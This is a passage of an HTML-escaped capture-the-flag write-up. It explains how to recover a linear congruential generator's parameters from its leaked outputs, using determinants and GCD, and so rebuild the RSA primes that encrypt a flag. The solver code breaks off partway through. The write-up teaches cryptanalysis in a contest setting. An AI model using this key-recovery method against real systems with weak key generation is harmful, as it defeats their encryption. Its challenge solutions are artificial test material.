&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] size: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;bits&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Calculate totient &amp;#39;Phi(n)&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;primes_arr:
&lt;&#x2F;span&gt;&lt;span&gt;        phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;(k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Calculate private key &amp;#39;d&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Generate Flag
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CTF{&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;endswith&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;}&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    enc_flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span&gt;(config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;flag)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;enc_flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Encrypt Flag
&lt;&#x2F;span&gt;&lt;span&gt;    _enc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(enc_flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;flag_file:
&lt;&#x2F;span&gt;&lt;span&gt;        flag_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(_enc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;little&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Export RSA Key
&lt;&#x2F;span&gt;&lt;span&gt;    rsa &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;RSA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;construct&lt;&#x2F;span&gt;&lt;span&gt;((n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;e))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;public.pem&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;w&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;pub_file:
&lt;&#x2F;span&gt;&lt;span&gt;        pub_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(rsa&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exportKey&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;dump.txt&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;2166771675595184069339107365908377157701164485820981409993925279512199123418374034275465590004848135946671454084220731645099286746251308323653144363063385
&lt;&#x2F;span&gt;&lt;span&gt;6729272950467625456298454678219613090467254824679318993052294587570153424935267364971827277137521929202783621553421958533761123653824135472378133765236115
&lt;&#x2F;span&gt;&lt;span&gt;2230396903302352921484704122705539403201050490164649102182798059926343096511158288867301614648471516723052092761312105117735046752506523136197227936190287
&lt;&#x2F;span&gt;&lt;span&gt;4578847787736143756850823407168519112175260092601476810539830792656568747136604250146858111418705054138266193348169239751046779010474924367072989895377792
&lt;&#x2F;span&gt;&lt;span&gt;7578332979479086546637469036948482551151240099803812235949997147892871097982293017256475189504447955147399405791875395450814297264039908361472603256921612
&lt;&#x2F;span&gt;&lt;span&gt;2550420443270381003007873520763042837493244197616666667768397146110589301602119884836605418664463550865399026934848289084292975494312467018767881691302197
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And the &lt;code&gt;flag.txt&lt;&#x2F;code&gt; is an encrypted flag.&lt;&#x2F;p&gt;
&lt;p&gt;Observations:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;1. The actual flag was encrypted with the RSA
&lt;&#x2F;span&gt;&lt;span&gt;2. The primes are generated using a Linear Congruential Generator
&lt;&#x2F;span&gt;&lt;span&gt;3. The seed is known
&lt;&#x2F;span&gt;&lt;span&gt;4. First 6 generated random values of LCG are known
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The LCG works on equation :&lt;&#x2F;p&gt;
&lt;p&gt;$$ X_{n+1} = (a \times X_{n}+c) mod p $$&lt;&#x2F;p&gt;
&lt;p&gt;Where,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;$$X(n)$$ is a sequence of pseudo random values.&lt;&#x2F;li&gt;
&lt;li&gt;$$p$$ is modulo defined as $$0 &amp;lt; p$$&lt;&#x2F;li&gt;
&lt;li&gt;$$a$$ is the multiplier defined as $$0 &amp;lt; a &amp;lt; p$$&lt;&#x2F;li&gt;
&lt;li&gt;$$c$$ is the increment $$0 &amp;lt;= c &amp;lt; p$$ ( if $$c = 0$$ the LCG is called Multiplicative Congruential Generator)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We can see the generate.py implementation.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;lcg_m = a lcg_c = c lcg_n = p&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We have total generated values of lcg including seed.&lt;&#x2F;p&gt;
&lt;p&gt;We can find the &lt;code&gt;n(modulus)&lt;&#x2F;code&gt; by making the 4 $$2 \times 2$$ matrices from $$ X_1,X_2,X_3,X_4,X_5,X_6,X_7$$ and finding the GCD of the determinant values of these 7 values.&lt;&#x2F;p&gt;
&lt;p&gt;The 4 $$2 \times 2$$ matrices,
$$
\begin{bmatrix}
X_1 - X_0 &amp;amp; X_2 - X_1\
X_2 - X_0 &amp;amp; X_3 - X_1
\end{bmatrix}
\begin{bmatrix}
X_2 - X_0 &amp;amp; X_3 - X_1\
X_3 - X_0 &amp;amp; X_4 - X_1
\end{bmatrix}$$&lt;&#x2F;p&gt;
&lt;p&gt;$$
\begin{bmatrix}
X_3 - X_0 &amp;amp; X_4 - X_1\
X_4 - X_0 &amp;amp; X_5 - X_1
\end{bmatrix},
\begin{bmatrix}
X_4 - X_0 &amp;amp; X_5 - X_1\
X_5 - X_0 &amp;amp; X_6 - X_1
\end{bmatrix}
$$&lt;&#x2F;p&gt;
&lt;p&gt;Finding determinant of these all and then finding the GCD of them will give us the modulus(n) used in lcg.&lt;&#x2F;p&gt;
&lt;p&gt;With $$n$$ we can find $$a$$ by solving these equations.&lt;&#x2F;p&gt;
&lt;p&gt;$$
X_1 = (a \times X_0+c) mod p\
X_2 = (a \times X_1+c) mod p\
$$&lt;&#x2F;p&gt;
&lt;p&gt;$$
X_2 - X_1 = (a \times X_1+c - (X_0 \times a+c)) mod p\
X_2 - X_1 = (a \times X_1 - (X_0 \times a)) mod p\
X_2 - X_1 = (X_1 - X_0) \times a mod p\
\frac{X_2 - X_1}{X_1 - X_0} = a mod p \
a = \frac{X_2 - X_1}{X_1 - X_0} mod p\
a = ((X_2 - X_1)) \times InverseMod(X_1 - X_0,p) mod p\
$$&lt;&#x2F;p&gt;
&lt;p&gt;Lets solve for $$c$$,&lt;&#x2F;p&gt;
&lt;p&gt;$$
X_1 = (a \times X_0+c) mod p\
X_1 - c = (a \times X_0) mod p\
-c = (a \times X_0 - X_1) mod p\
c = (X_1 - a \times X_0) mod p
$$&lt;&#x2F;p&gt;
&lt;p&gt;So, with &lt;code&gt;n,c,m&lt;&#x2F;code&gt; we can generate entire series which is used to generate primes in the encryption.&lt;&#x2F;p&gt;
&lt;p&gt;The python implementation to find &lt;code&gt;n,c,m&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;math
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calc_det&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;j&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;X&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    a1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    b1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X[i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    a2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X[j] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    b2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X[j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;X[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    det &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;a1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;a2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;b1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;abs&lt;&#x2F;span&gt;&lt;span&gt;(det)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GCD&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;abs&lt;&#x2F;span&gt;&lt;span&gt;(a)
&lt;&#x2F;span&gt;&lt;span&gt;    b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;abs&lt;&#x2F;span&gt;&lt;span&gt;(b)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;a:
&lt;&#x2F;span&gt;&lt;span&gt;        a, b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;a, a
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;b
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;modInverse&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;m&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GCD&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;m) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;None  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#if not releatively prime no modinv
&lt;&#x2F;span&gt;&lt;span&gt;    u1, u2, u3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, a
&lt;&#x2F;span&gt;&lt;span&gt;    v1, v2, v3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;, m
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;v3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;u3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;v3 
&lt;&#x2F;span&gt;&lt;span&gt;        v1, v2, v3, u1, u2, u3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            u1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;v1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            u2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;v2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            u3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;v3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            v1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            v2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            v3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;u1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            X &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2166771675595184069339107365908377157701164485820981409993925279512199123418374034275465590004848135946671454084220731645099286746251308323653144363063385&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
